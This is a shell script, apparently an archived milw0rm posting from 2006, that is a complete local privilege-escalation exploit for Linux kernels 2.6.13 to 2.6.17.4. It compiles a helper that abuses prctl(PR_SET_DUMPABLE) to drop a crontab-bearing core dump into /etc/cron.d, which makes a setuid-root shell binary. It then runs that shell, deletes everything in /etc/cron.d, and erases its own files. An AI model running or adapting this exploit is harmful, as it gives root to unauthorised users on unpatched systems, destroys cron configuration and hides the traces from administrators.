#!/bin/sh
#
# PRCTL local root exp By: Sunix
# + effected systems 2.6.13<= x <=2.6.17.4 + 2.6.9-22.ELsmp
# tested on Intel(R) Xeon(TM) CPU 3.20GHz
# kernel 2.6.9-22.ELsmp
# maybe others ...
# Tx to drayer & RoMaNSoFt for their clear code...
#
# zmia23@yahoo.com


cat > /tmp/getsuid.c << __EOF__
#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <linux/prctl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>

char *payload="\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * *   root   chown root.root /tmp/s ; chmod 4777 /tmp/s ; rm -f /etc/cron.d/core\n";

int main() { 
    int child;
    struct rlimit corelimit;
    corelimit.rlim_cur = RLIM_INFINITY;
    corelimit.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &corelimit);
    if ( !( child = fork() )) {
        chdir("/etc/cron.d");
        prctl(PR_SET_DUMPABLE, 2);
        sleep(200);
        exit(1);
    }
    kill(child, SIGSEGV);
    sleep(120);
}
__EOF__

cat > /tmp/s.c << __EOF__
#include<stdio.h>
main(void)
{
setgid(0);
setuid(0);
system("/bin/sh");
system("rm -rf /tmp/s");
system("rm -rf /etc/cron.d/*");
return 0;
}
__EOF__
echo "wait aprox 4 min to get sh"
cd /tmp
cc -o s s.c
cc -o getsuid getsuid.c
./getsuid
./s
rm -rf getsuid*
rm -rf s.c
rm -rf prctl.sh

# milw0rm.com [2006-07-14]
